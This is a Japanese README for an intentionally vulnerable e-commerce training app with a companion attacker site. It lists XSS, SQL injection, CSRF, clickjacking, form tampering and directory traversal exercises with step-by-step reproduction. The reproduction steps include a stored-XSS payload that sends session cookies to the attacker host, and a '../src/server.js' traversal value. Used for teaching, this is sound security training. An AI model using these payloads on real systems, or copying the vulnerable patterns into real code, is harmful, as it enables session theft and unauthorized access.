# vulnerable-shop

脆弱性体験ハンズオン用の「とても脆弱なECサイト」です。**本番利用厳禁**。

## 構成

- Shop（脆弱EC）: Express + EJS + SQLite。学習用の脆弱性（XSS / SQLi / CSRF / 改ざん）を含みます。
- Attacker（攻撃者サイト）: CSRF体験用の罠サイト。Shopに対してコメント投稿や購入リクエストを送信します。

## 必要なもの

- Docker（Desktop等）
- Docker Compose（`docker compose` が使えること）

## セットアップ

```bash
docker compose build
```

## 起動（Docker）

```bash
docker compose up
```

- Shop（脆弱EC）: `http://localhost:8000`
- Attacker（攻撃者サイト）: `http://localhost:9000`

停止する場合は別ターミナルで `docker compose down` を実行してください。

## 初期データ

起動時にテーブルを作り直すため、**ユーザー/コメント/注文は毎回初期化**されます。

- ユーザー: `alice / password123`, `bob / password123`
- 商品: Coffee Beans / Drip Bag / Mug Cup

## 環境変数（任意）

### Shop

- `PORT`（既定: 8000）
- `SESSION_SECRET`（既定: dev-secret）
- `DATABASE_PATH`（既定: `/data/shop.db`）
- `ATTACKER_URL`（既定: `http://localhost:9000`。Hands-onページのリンク先に利用）
- `FILES_ROOT`（既定: `/app/files`。学習用の添付画像パスの基準ディレクトリ）

### Attacker

- `PORT`（既定: 9000）
- `TARGET_BASE`（既定: `http://localhost:8000`。攻撃対象のShop URL）

## 体験に使う導線（概要）

- **XSS**:
  - `/search` の検索語が無エスケープで反映（反射型）
  - `/products/:id` のコメントが無エスケープで表示（保存型）
- **セッションハイジャック**:
  - `httpOnly: false` のセッションCookieを、保存型XSSから `document.cookie` で盗める
  - Attacker の `/session-hijack` で stolen cookie を確認し、`/orders` へ再利用できる
- **クリックジャッキング**:
  - Shop がフレーム埋め込みを禁止していないため、Attacker の `/clickjacking` から `/purchase/1` を iframe で重ねられる
  - CSRF のように攻撃者が直接 POST するのではなく、被害者自身に Shop の本物の購入ボタンを押させられる
- **SQL Injection**:
  - `/login` のユーザー名/パスワードが文字列結合SQL
  - `/search` の `q` が文字列結合SQL（UNION/コメント構文が有効）
- **フォーム値改ざん**: `/purchase/:productId` の `unit_price_yen` / `total_yen` を改ざんして送信
- **ディレクトリ・トラバーサル**:
  - `/products/:id` のコメントに保存した添付画像パスを `/comment-images/:commentId` が未検証で参照
  - `../src/server.js` のような値で、想定外のファイルを読み出せる
- **CSRF**:
  - Attacker の `/` でコメント投稿を偽装
  - Attacker の `/auto-purchase` で購入リクエストを自動送信

詳しい手順は起動後に画面内の「Hands-on」リンクを参照してください（Shop側に手順を表示します）。

## クリックジャッキングの再現手順

1. `alice / password123` で Shop にログインする
2. `http://localhost:9000/clickjacking` を開く
3. 「本物の Shop 画面を表示する」を押し、背後に `/purchase/1` の実画面が埋め込まれていることを確認する
4. 「隠してもう一度試す」で戻し、表示された「景品を受け取る」位置をクリックする
5. `http://localhost:8000/orders` を開く
6. 自分では Shop の購入画面を操作していないのに、注文が 1 件追加されていることを確認する

このシナリオでは、攻撃者ページが `/purchase` に直接リクエストしているわけではありません。被害者のクリックが iframe 内の本物の Shop UI に到達している点が CSRF との違いです。

## セッションハイジャックの再現手順

1. `alice / password123` で Shop にログインし、`/products/1` を開く
2. コメント欄に次の payload を投稿する

```html
<script>fetch('http://localhost:9000/collect?cookie=' + encodeURIComponent(document.cookie))</script>
```

3. 商品詳細を再表示し、保存型XSSで Cookie が Attacker 側へ送られることを発生させる
4. `http://localhost:9000/session-hijack` を開き、盗まれた `connect.sid` が表示されることを確認する
5. 「盗んだセッションで注文履歴を見る」を押し、被害者のログイン状態で `/orders` を閲覧できることを確認する
## ディレクトリ・トラバーサルの再現手順

1. `alice / password123` でログインし、`/products/1` を開く
2. コメント欄の「添付画像パス（学習用）」に `samples/coffee.svg` を入れて投稿し、通常の画像表示を確認する
3. 続けて `../src/server.js` を入れて投稿する
4. 投稿されたコメントの「添付ファイルを開く」を押す
5. 本来は画像だけが表示される想定なのに、Shop のサーバーソースが読めることを確認する

## 注意

- このアプリは意図的に脆弱です。**本番利用・社内ネットワークへの持ち込み禁止**を推奨します。
